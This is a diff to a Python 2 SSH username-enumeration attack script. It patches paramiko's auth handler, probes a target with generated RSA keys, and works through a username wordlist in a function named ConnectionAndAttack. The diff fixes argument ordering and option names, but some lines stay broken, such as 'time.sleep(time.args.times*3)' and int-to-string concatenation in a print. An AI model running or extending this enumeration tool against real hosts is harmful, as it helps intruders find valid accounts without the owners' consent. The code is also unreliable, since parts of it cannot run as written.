@@ -58,7 +58,7 @@ paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USER
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
 
-def ConnectionAndAttack(target, port, user, tried = 0, verbose):
+def ConnectionAndAttack(target, port, user, verbose, tried = 0):
     s = socket.socket()
     try:
         s.connect((target, port))
@@ -75,7 +75,7 @@ def ConnectionAndAttack(target, port, user, tried = 0, verbose):
             tried += 1
             if verbose:
                 print colors.bg.yellow, "[*] Problem with the server, tries = " + tried
-            return ConnectionAndAttack(target, port, user, tried, verbose)
+            return ConnectionAndAttack(target, port, user, verbose, tried)
     try:
         transport.auth_publickey(user, paramiko.RSAKey.generate(1024))
     except InvalidUser:
@@ -90,16 +90,16 @@ def main():
     parser.add_argument("--port", default=22, help="port [Default=22]", type=int, action="store")
     parser.add_argument("-w", "--wordlist", help="Wordlist with the usernames", type=str, action="store")
     parser.add_argument("--verbose", help="Set verbose mode", default=False, action="store_true")
-    parser.add_argument("-T", help = "T<0-4>:Set timing template", action="store", type=int)
+    parser.add_argument("-T", "--times", help = "T<0-4>:Set timing template", action="store", type=int)
     args = parser.parse_args()
     file = open(args.wordlist)
     users = file.readlines()
     file.close()
     for user in users:
         user = user.strip()
-        if args.time:
-            time.sleep(time.args.time*3)
-        ConnectionAndAttack(args.target, args.port, user, verbose)
+        if args.times:
+            time.sleep(time.args.times*3)
+        ConnectionAndAttack(args.target, args.port, user, args.verbose)
 
 if __name__ == '__main__':
     try:
